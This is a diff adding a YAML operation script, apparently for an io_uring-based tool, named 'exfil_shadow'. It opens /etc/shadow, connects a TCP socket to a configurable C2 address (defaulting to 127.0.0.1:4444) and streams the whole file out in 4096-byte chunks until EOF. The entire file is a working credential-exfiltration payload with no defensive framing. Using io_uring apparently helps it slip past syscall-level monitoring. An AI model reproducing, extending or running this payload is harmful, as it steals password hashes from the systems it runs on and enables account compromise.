@@ -1,0 +1,38 @@
+name: exfil_shadow
+description: Read /etc/shadow (full file, chunked until EOF) and exfiltrate to C2 via io_uring
+requires_kernel: "5.6"
+
+config:
+  c2_ip:   "127.0.0.1"
+  c2_port: 4444
+
+ops:
+  - openat:
+      path: "/etc/shadow"
+      result: file_fd
+
+  - socket:
+      domain: AF_INET
+      type:   SOCK_STREAM
+      result: sock_fd
+
+  - connect:
+      fd:   sock_fd
+      ip:   "{{ c2_ip }}"
+      port: "{{ c2_port }}"
+
+  # Transfer the whole file in 4096-byte chunks until EOF —
+  # no silent truncation for files larger than one chunk.
+  - read_send:
+      until_eof: true
+      fd:        file_fd
+      send_fd:   sock_fd
+      buf:       auto
+      len:       4096
+
+  # Teardown — close results are deliberately ignored
+  - close:
+      fd: file_fd
+
+  - close:
+      fd: sock_fd
